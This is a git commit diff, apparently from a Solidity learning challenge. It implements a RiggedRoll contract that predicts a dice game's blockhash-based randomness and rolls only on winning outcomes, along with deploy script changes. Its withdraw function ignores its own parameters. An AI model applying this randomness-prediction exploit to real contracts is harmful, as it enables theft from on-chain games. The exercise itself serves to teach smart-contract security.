e0c423da1a4d52d3db5bdcf83f8e94543cb8e365
rlars.eth <rickardlarsson22@gmail.com>
2022-10-18 17:28:41 +0100

    Add all my files

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -9,16 +9,34 @@ contract RiggedRoll is Ownable {
 
     DiceGame public diceGame;
 
+    mapping (address => uint) pendingRollDiceValue;
+
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address _addr, uint256 amount) public onlyOwner {
+        payable(msg.sender).transfer(address(this).balance);
 
-
+    }
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public payable {
+        require(address(this).balance >= 0.002 ether, "Insufficient balance");
+
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
+
+        require(roll <= 2, "Throw not valid");
+
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
 
 
     //Add receive() function so contract can receive Eth
+    receive() external payable {
+
+    }
     
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,17 +9,17 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
+  
   await deploy("RiggedRoll", {
    from: deployer,
    args: [diceGame.address],
    log: true,
   });
-  */
+  
 
-  //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
-  //const ownershipTransaction = await riggedRoll.transferOwnership("** YOUR FRONTEND ADDRESS **");
+  const ownershipTransaction = await riggedRoll.transferOwnership("0xCd0565B40A7ab5A59a57a57a0e680A364A4270E2");
   
 
 };
